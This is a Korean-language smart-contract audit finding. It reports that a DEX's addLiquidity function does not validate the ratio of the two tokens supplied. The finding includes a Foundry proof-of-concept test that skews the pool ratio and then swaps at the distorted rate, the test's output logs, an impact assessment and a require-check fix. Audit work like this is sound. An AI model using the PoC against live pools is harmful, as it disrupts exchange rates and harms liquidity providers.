# DEX - addLiquidity의 유동성 공급비 검증의 부재

## 설명

<aside>

### **키워드 : Vulnerability - 유동성 풀 조작**

### **심각도 : Critical**

`addLiquidity` 함수내부에서 두 토큰의 유동성 공급량 비율에 대한 검증이 이루어지지 않는다.
이를 악용하여 유동성 풀에 원하는 비율로 토큰을 공급하여 교환비를 조작할 수 있다.

</aside>

```solidity
if (totalLiquidity == 0) {
    // 정밀도
    lpTokenCreated = _sqrt(tokenXAmount * tokenYAmount);
    require(lpTokenCreated >= tokenMinimumOutputAmount, "Minimum liquidity not met.");
    totalLiquidity = lpTokenCreated;
} else {
    {
        tokenXReserve = tokenX.balanceOf(address(this));
        tokenYReserve = tokenY.balanceOf(address(this));


        // L_x = X*P_x, L_y = Y*P_y (유동성 가치의 토큰 가치 비례) => P_x = L_x/X
        liquidityX = _div(_mul(tokenXAmount, totalLiquidity), tokenXReserve);
        liquidityY = _div(_mul(tokenYAmount, totalLiquidity), tokenYReserve);

    }
    // 최소 수량 유동성 공급 검증
    lpTokenCreated = (liquidityX < liquidityY) ? liquidityX : liquidityY;
    require(lpTokenCreated >= tokenMinimumOutputAmount, "Minimum liquidity not met.");
    totalLiquidity += lpTokenCreated;
}

liquidity[msg.sender] += lpTokenCreated;
tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
```

토큰 발급은 더 적은 토큰 공급량에 맞추기 때문에 이를 악용하여 DEX의 유동성을 탈취하는 행위는 불가능하다.

하지만 기존 비율과 맞지 않는 유동성을 공급할 수 있고, 이는 전체 유동성 풀의 비율을 깨뜨릴 수 있게 된다.

## PoC

```solidity
function testPOC() external {
    tokenX.transfer(address(0x01), 1 ether);
    tokenY.transfer(address(0x01), 100 ether);

    tokenX.transfer(address(0x02), 100 ether);
    tokenY.transfer(address(0x02), 102 ether);
    uint256 LP1;
    vm.startPrank(address(0x01));
    {
        tokenX.approve(address(dex), type(uint).max);
        tokenY.approve(address(dex), type(uint).max);
        LP1 = dex.addLiquidity(1 ether, 100 ether, 0);
        console.log("LP1", LP1);
    }
    vm.stopPrank();

    vm.startPrank(address(0x02));
    {
        tokenX.approve(address(dex), type(uint).max);
        tokenY.approve(address(dex), type(uint).max);
        uint256 lp = dex.addLiquidity(100 ether, 1 ether, 0);
        console.log("LP2", lp);

        console.log(
            "user 2 : before swap balance",
            tokenX.balanceOf(address(0x02)),
            tokenY.balanceOf(address(0x02))
        );
        uint res = dex.swap(0, 101 ether, 0);
        console.log(
            "user 2 : after swap balance",
            tokenX.balanceOf(address(0x02)),
            tokenY.balanceOf(address(0x02))
        );

        dex.removeLiquidity(lp, 0, 0);
        console.log(
            "user 2 : Attack result",
            tokenX.balanceOf(address(0x02)),
            tokenY.balanceOf(address(0x02))
        );
    }
    vm.stopPrank();
}
```

```solidity
Running 1 test for test/DEX.t.sol:DexTest
[PASS] testPOC() (gas: 463358)
Logs:
  LP1 10000000000000000000
  LP2 100000000000000000
  user 2 : before swap balance 0 101000000000000000000
  user 2 : after swap balance 50474737368684342171 0
  user 2 : Attack result 50974987493746873436 2000000000000000000
```

swap의 결과를 보면 알 수 있듯 100:1 의 가치로 교환이 되어야 하지만 유동성 풀의 비율이 101:101 로 깨진 상태이기에 Y토큰 101 ether로 X 토큰 약 50 ether를 교환한 것을 확인할 수 있다.

하지만 토큰 발행량은 더 적은 쪽인 Y토큰에 맞춰 발행되었기에  LP 토큰 수는 실제 공급량보다 적게 발행되었기에 공격을 시도하더라도 공격자가 이득을 취할 수 있는 방법은 존재하지 않는 것으로 보인다.

## 파급력

개인이든 집단이든 공격을 통해 유동성풀의 비율을 깨뜨려 교환비를 변경할 수는 있지만, 공격을 통해 깨진 유동성 풀의 비율로 인한 이득은 기존에 유동성풀을 공급한 모두가 공유하는 구조이기에 공격을 위해 투자한 비용을 모두 회수하며 추가적인 이득을 보는 방법은 존재하지 않는다.

피싱이나 요청을 조작하는 등 제 3자가 잘못된 비율로 유동성공급을 하도록 유도한 뒤 변화한 유동성을 이용하여 토큰을 변환하거나 유동성을 제거하여 이득을 취할 수는 있지만 이를 직접 유동성의 변화를 만든뒤 이득을 취하는 용도로 악용하는 방도는 없어 보인다.

그렇다고 할지라도 DEX의 중심 기능이자 핵심인 유동성 풀의 비율을 자본을 투입하여 망가뜨릴 수 있다는 것은 DEX의 가용성을 해친다고도 볼 수 있기에 위험도는 매우 위험하다고 판단하였다.

## 해결 방법

```solidity
require(
    tokenXAmount * amountY == tokenYAmount * amountX,
    "imbalance add liquidity"
);
```

를 추가하여 비율이 맞지 않으면 revert 시키거나 비율에 맞는 만큼만 공급량에 추가하도록 로직을 수정해야 한다.
